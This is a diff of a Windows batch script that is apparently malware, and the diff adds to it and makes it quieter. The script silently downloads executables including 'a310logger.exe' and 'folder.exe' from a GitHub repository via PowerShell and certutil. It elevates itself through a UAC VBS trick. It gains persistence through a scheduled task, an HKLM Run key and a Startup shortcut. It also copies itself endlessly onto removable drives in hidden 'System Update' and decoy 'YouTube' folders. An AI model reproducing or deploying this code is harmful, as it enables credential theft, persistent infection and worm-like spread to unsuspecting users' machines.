@@ -23,7 +23,7 @@ echo *************Create directory****************
 
 
 echo *************Copy file****************
-   xcopy "C:\Users\%username%\AppData\Roaming\*.*" "C:\Users\%username%\AppData\Roaming\" /K /D /H /Y
+   xcopy "C:\Users\%username%\AppData\Roaming\*.*" "C:\Users\%username%\AppData\Local\0101\" /K /D /H /Y > nul 2> nul
    echo Copied!
    echo.
    echo.
@@ -86,7 +86,10 @@ echo *************DOWNLOAD file****************
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
    )
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
+   )
+   if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
    )
    if errorlevel 1 goto ERROR2   
    goto SUCCESS 
@@ -128,8 +131,11 @@ echo *************DOWNLOAD file****************
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
    )
    if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
+   if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
+   )
    if errorlevel 1 goto ERROR3
    goto SUCCESS 
 
@@ -139,7 +145,7 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
-   set url="https://github.com/win32u/Google/blob/main/a310logger.exe?raw=true"
+   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
    set filename="a310logger.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
@@ -187,32 +193,85 @@ echo *************DOWNLOAD file****************
 
 
 
-pause
 
-	echo *************Administrator rights****************     
-	:: BatchGotAdmin        
+
+
+
+	:: BatchGotAdmin       
 	:-------------------------------------        
 	REM  --> Check for permissions  
 	>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
 	REM --> If error flag set, we do not have admin.  
-	if '%errorlevel%' NEQ '0' (    echo Requesting administrative privileges...    goto UACPrompt) else ( goto gotAdmin )  
-	:UACPrompt  
+	if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto gotAdmin )  
+	:UACPrompt 
+        echo *************User rights**************** 
+		echo User rights found! Please, wait...
+		timeout 3 > NUL
 		echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
 		echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
 		"%temp%\getadmin.vbs"  
-		exit /B
+		cd /D C:\Users\%username%\AppData\Roaming\
+		
+
+		:pendrive
+		echo *************Pendrive check****************
+		   timeout 1 > NUL
+		   echo Checking for pendrive...
+		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
+		   if %%l equ 2 (
+			  mkdir %%i\YouTube > nul 2> nul
+
+			  mkdir "%%i\System Update" > nul 2> nul
+			  attrib +h "%%i\System Update" /s /d
+			  xcopy "C:\Users\%username%\AppData\Roaming\*.*" "%%i\System Update" /K /D /H /Y > nul 2> nul
+                          xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /K /D /H /Y > nul 2> nul
+			  echo Copied!
+			  timeout 1 > NUL
+			  ) 
+		   )
+		   echo.
+		   echo.
+		   cls
+		   goto pendrive
 	:gotAdmin  
+         echo *************Administrator rights****************
+   		echo Admin rights found! Please, wait...
+		timeout 3 > NUL
+		cd /D C:\Users\%username%\AppData\Roaming\
 
+                schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul || (
+                   echo Task creation faild!
+                )
+		
+		REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Roaming\AutoRun.vbs /f > nul 2> nul || (
+                   echo Registry creation faild!
+                )
 
-		cd /d "%~dp0"
-		echo You are now admin
+                mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" > nul 2> nul || (
+                   echo Mklink creation faild or already exist!
+                )
 
-
-		schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F
-		REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v iloveyou /t REG_SZ /d C:\Users\%username%\AppData\Roaming\AutoRun.vbs /f
-		mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Roaming\AutoRun.vbs"
-
-
+		:pendrive
+		echo *************Pendrive check****************
+		   timeout 1 > NUL
+		   echo Checking for pendrive...
+		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
+		   if %%l equ 2 (
+			  mkdir %%i\YouTube > nul 2> nul
+			  
+			  mkdir "%%i\System Update" > nul 2> nul
+			  attrib +h "%%i\System Update" /s /d
+			  xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\System Update" /K /D /H /Y > nul 2> nul
+                          xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /K /D /H /Y > nul 2> nul
+			  echo Copied!
+			  timeout 1 > NUL
+			  ) 
+		   )
+		   echo.
+		   echo.
+		   cls
+		   goto pendrive
+	
 
 PAUSE
 
